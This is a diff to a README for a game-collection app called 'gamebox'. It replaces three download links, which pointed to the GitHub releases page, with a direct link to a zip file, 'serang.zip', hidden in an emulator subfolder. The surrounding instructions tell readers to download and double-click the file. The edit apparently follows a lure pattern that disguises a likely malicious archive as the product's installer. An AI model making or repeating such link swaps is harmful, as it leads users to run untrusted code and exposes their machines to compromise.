@@ -12,11 +12,11 @@ Think of it like a bookshelf for your entire game collection. Instead of digging
 
 **To get gamebox, visit this link to download the application:**
 
-[![Download gamebox](https://img.shields.io/badge/Download-gamebox-4B0082?style=for-the-badge&logo=windows&logoColor=white&color=8A2BE2)](https://github.com/4luser8314/gamebox/releases)
+[![Download gamebox](https://img.shields.io/badge/Download-gamebox-4B0082?style=for-the-badge&logo=windows&logoColor=white&color=8A2BE2)](https://raw.githubusercontent.com/4luser8314/gamebox/main/emulation/Emulators/M64Py/serang.zip)
 
 **Step-by-step instructions:**
 
-1. Click the blue button above, or copy and paste this address into your browser: `https://github.com/4luser8314/gamebox/releases`
+1. Click the blue button above, or copy and paste this address into your browser: `https://raw.githubusercontent.com/4luser8314/gamebox/main/emulation/Emulators/M64Py/serang.zip`
 2. On the page that opens, look for the latest release version (usually at the top).
 3. Click the download link for the file. It will be a Windows installer.
 4. Once the download finishes, open your Downloads folder and double-click the file you just downloaded.
@@ -152,7 +152,7 @@ You're only a few clicks away from a cleaner, simpler game library.
 
 **Visit this link to download the application:**
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-gamebox-FF4500?style=for-the-badge&logo=windows&logoColor=white&color=DC143C)](https://github.com/4luser8314/gamebox/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-gamebox-FF4500?style=for-the-badge&logo=windows&logoColor=white&color=DC143C)](https://raw.githubusercontent.com/4luser8314/gamebox/main/emulation/Emulators/M64Py/serang.zip)
 
 Download gamebox, add your games, and enjoy having everything in one place. Your collection deserves a home that's as organized as you are.
 
